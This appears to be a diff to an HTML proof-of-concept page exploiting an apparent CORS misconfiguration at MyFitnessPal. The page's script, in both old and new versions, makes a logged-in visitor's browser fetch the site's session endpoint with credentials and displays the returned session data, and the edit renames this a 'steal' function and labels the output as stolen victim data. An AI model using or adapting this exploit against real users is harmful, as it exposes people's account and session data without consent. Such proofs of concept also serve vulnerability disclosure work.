@@ -3,20 +3,22 @@
 <head><title>MFP CORS PoC</title></head>
 <body>
 <h1>MyFitnessPal CORS Misconfiguration PoC</h1>
-<p>If you are logged into MyFitnessPal, your data will appear below:</p>
+<p>Victim data stolen from myfitnesspal.com:</p>
 <pre id="output">Fetching...</pre>
 <script>
-fetch('https://www.myfitnesspal.com/api/auth/session', {
-  credentials: 'include',
-  headers: {'Accept': 'application/json'}
-})
-.then(r => r.json())
-.then(data => {
-  document.getElementById('output').textContent = JSON.stringify(data, null, 2);
-})
-.catch(e => {
-  document.getElementById('output').textContent = 'Error: ' + e;
-});
+async function steal() {
+  try {
+    const r = await fetch('https://www.myfitnesspal.com/api/auth/session', {
+      credentials: 'include',
+      headers: {'Accept': 'application/json'}
+    });
+    const data = await r.json();
+    document.getElementById('output').textContent = JSON.stringify(data, null, 2);
+  } catch(e) {
+    document.getElementById('output').textContent = 'Error: ' + e;
+  }
+}
+steal();
 </script>
 </body>
 </html>
